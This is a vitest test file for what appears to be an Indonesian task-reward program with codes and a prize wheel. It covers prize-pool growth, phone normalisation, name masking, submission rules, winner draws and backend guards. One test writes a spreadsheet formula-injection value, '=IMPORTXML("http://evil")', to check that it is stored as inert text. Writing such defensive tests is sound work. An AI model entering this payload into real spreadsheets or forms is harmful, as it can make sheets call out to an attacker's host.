import { beforeEach, describe, expect, it } from 'vitest'
import { invalidate } from '@/lib/cache'
import { goldenAmount, formatRupiah } from '@/lib/golden'
import {
  eligibleEntries, maskName, myCodes, normalizeWhatsapp, programSummary, reviewTaskSubmissions, saveTask, spin, submitTask, voidDraw,
} from '@/lib/program-service'
import { setStore } from '@/lib/repo'
import { AppsScriptStore } from '@/lib/repo/apps-script-store'
import { LocalStore } from '@/lib/repo/memory-store'
import { taskSubmissionsTable } from '@/lib/repo/programs'
import { getSettingsFresh, saveSettings } from '@/lib/repo/settings'
import type { TableStore } from '@/lib/repo/store'
import { createAppsScriptSim } from './apps-script-sim'

const SECRET = 'x'.repeat(40)

describe('golden pool', () => {
  const pool = { golden_pool_start: 2_000_000, golden_pool_end: 5_000_000, golden_start_at: '2026-11-07T00:00:00+07:00', golden_end_at: '2026-12-05T23:59:59+07:00' }
  it('starts at 2jt, ends at 5jt on 5 Dec, grows monotonically in between', () => {
    expect(goldenAmount(pool, Date.parse('2026-11-01T00:00:00Z'))).toBe(2_000_000)
    expect(goldenAmount(pool, Date.parse('2026-12-06T00:00:00+07:00'))).toBe(5_000_000)
    const a = goldenAmount(pool, Date.parse('2026-11-20T12:00:00Z'))
    const b = goldenAmount(pool, Date.parse('2026-11-20T12:00:05Z'))
    expect(a).toBeGreaterThan(2_000_000)
    expect(a).toBeLessThan(5_000_000)
    expect(b).toBeGreaterThan(a)
    expect(b - a).toBeLessThan(20) // "sedikit demi sedikit": a few rupiah every second
  })
  it('formats rupiah', () => expect(formatRupiah(2345678)).toBe('Rp2.345.678'))
})

describe('identity helpers', () => {
  it('normalizes Indonesian WhatsApp numbers', () => {
    for (const v of ['081234567890', '+62 812-3456-7890', '6281234567890', '81234567890']) expect(normalizeWhatsapp(v)).toBe('6281234567890')
    for (const v of ['12345', '021555123', 'abc', '']) expect(normalizeWhatsapp(v)).toBeNull()
  })
  it('masks names for public winner lists', () => {
    expect(maskName('Rina Utami Sari')).toBe('Rina U.')
    expect(maskName('Budi')).toBe('Budi')
  })
})

describe.each([
  ['memory', () => new LocalStore(null) as TableStore],
  ['Apps Script (real Code.js, simulated sheet)', () => new AppsScriptStore('https://sim', SECRET, createAppsScriptSim(SECRET).poster) as TableStore],
])('program flow on %s', (_n, make) => {
  beforeEach(() => {
    setStore(make())
    invalidate()
  })

  async function setup() {
    const t1 = await saveTask('pelatihan', { title: 'Buat video 30 detik', description: '', proof_hint: 'link TikTok', active: true, order: 1 }, 'owner@x.id')
    const t2 = await saveTask('pelatihan', { title: 'Upload ke Sharein', description: '', proof_hint: '', active: true, order: 2 }, 'owner@x.id')
    return { t1, t2 }
  }
  const sub = (task_id: string, wa = '081234567890', name = 'Rina Utami') => ({ task_id, name, whatsapp: wa, proof_url: 'https://www.tiktok.com/@rina/video/1', note: '' })

  it('one finished task = one unique code; same task twice by same identity is refused', async () => {
    const { t1, t2 } = await setup()
    const a = await submitTask('pelatihan', sub(t1.id))
    const b = await submitTask('pelatihan', sub(t2.id, '+62 812 3456 7890'))
    expect(a.ok && a.code).toMatch(/^PC-[A-Z2-9]{6}$/)
    expect(b.ok && b.code).toMatch(/^PC-/)
    expect(a.ok && b.ok && a.code !== b.code).toBe(true)
    const again = await submitTask('pelatihan', sub(t1.id, '6281234567890'))
    expect(again.ok).toBe(false)
    expect(!again.ok && again.message).toContain(a.ok ? a.code : '')
    const mine = await myCodes('pelatihan', '0812-3456-7890')
    expect(mine?.codes).toHaveLength(2)
  })

  it('validates identity, proof link, task, and closed program', async () => {
    const { t1 } = await setup()
    expect(await submitTask('pelatihan', { ...sub(t1.id), whatsapp: '123' })).toMatchObject({ ok: false, field: 'whatsapp' })
    expect(await submitTask('pelatihan', { ...sub(t1.id), proof_url: 'http://x.com' })).toMatchObject({ ok: false, field: 'proof_url' })
    expect(await submitTask('duta', sub(t1.id))).toMatchObject({ ok: false, field: 'task_id' })
    const s = await getSettingsFresh()
    await saveSettings({ ...s, pelatihan_open: false })
    expect((await submitTask('pelatihan', sub(t1.id))).ok).toBe(false)
  })

  it('only approved codes enter the wheel; winner recorded; unique winner rule; void returns code', async () => {
    const { t1, t2 } = await setup()
    await submitTask('pelatihan', sub(t1.id, '081111111111', 'Andi'))
    await submitTask('pelatihan', sub(t2.id, '081111111111', 'Andi'))
    await submitTask('pelatihan', sub(t1.id, '082222222222', 'Budi'))
    expect((await spin('pelatihan', 100000, 'owner@x.id')).ok).toBe(false)
    const all = await taskSubmissionsTable.list()
    await reviewTaskSubmissions('pelatihan', all.map((s) => s.id), 'approve', '', 'owner@x.id')
    invalidate()
    expect((await programSummary('pelatihan')).inWheel).toBe(3)
    const r1 = await spin('pelatihan', 150000, 'owner@x.id')
    if (!r1.ok) throw new Error('spin failed')
    expect(r1.segments[r1.winnerIndex]).toBe(r1.draw.code)
    expect(r1.draw.prize).toBe(150000)
    invalidate()
    const s1 = await programSummary('pelatihan')
    expect(s1.winners[0]).toMatchObject({ code: r1.draw.code, prize: 150000 })
    // Unique winner: the winner's other code is out, so only the other person remains.
    const r2 = await spin('pelatihan', 150000, 'owner@x.id')
    if (!r2.ok) throw new Error('spin 2 failed')
    expect(r2.draw.identity_key).not.toBe(r1.draw.identity_key)
    expect((await spin('pelatihan', 1000, 'owner@x.id')).ok).toBe(false)
    await voidDraw(r2.draw.id, 'owner@x.id')
    invalidate()
    // Voiding returns every code of that person (Andi has 2, Budi has 1) to the wheel.
    expect((await programSummary('pelatihan')).inWheel).toBe(r2.draw.name === 'Andi' ? 2 : 1)
  })
})

describe('eligibleEntries', () => {
  it('excludes pending/rejected, other programs, and past winners', () => {
    const base = { created_at: '', task_id: 't', whatsapp: '', proof_url: '', note: '', reject_reason: '', reviewed_by: '', reviewed_at: '' }
    const subs = [
      { ...base, id: '1', program: 'duta', identity_key: 'a', name: 'A', code: 'DT-1', status: 'approved' },
      { ...base, id: '2', program: 'duta', identity_key: 'b', name: 'B', code: 'DT-2', status: 'pending' },
      { ...base, id: '3', program: 'pelatihan', identity_key: 'c', name: 'C', code: 'PC-3', status: 'approved' },
      { ...base, id: '4', program: 'duta', identity_key: 'a', name: 'A', code: 'DT-4', status: 'approved' },
    ] as const
    const draws = [{ id: 'd', time: '', program: 'duta', code: 'DT-1', submission_id: '1', name: 'A', identity_key: 'a', prize: 1, actor: '', status: 'active' }] as const
    expect(eligibleEntries('duta', [...subs], [...draws], true).map((s) => s.code)).toEqual([])
    expect(eligibleEntries('duta', [...subs], [...draws], false).map((s) => s.code)).toEqual(['DT-4'])
  })
})

describe('Apps Script Code.js guards', () => {
  it('rejects wrong secret and stores formula-looking input as text', async () => {
    const sim = createAppsScriptSim(SECRET)
    const bad = new AppsScriptStore('https://sim', 'y'.repeat(40), sim.poster)
    await expect(bad.read('settings')).rejects.toThrow(/unauthorized/)
    const good = new AppsScriptStore('https://sim', SECRET, sim.poster)
    await good.append('audit_log', [['2026', '=IMPORTXML("http://evil")', 'x', 'y', '', '']])
    const { rows } = await good.read('audit_log')
    expect(rows[0][1]).toBe('=IMPORTXML("http://evil")')
    expect(sim.sheets.get('audit_log')!.grid[0]).toEqual(['time', 'actor', 'action', 'target', 'before', 'after'])
  })
})
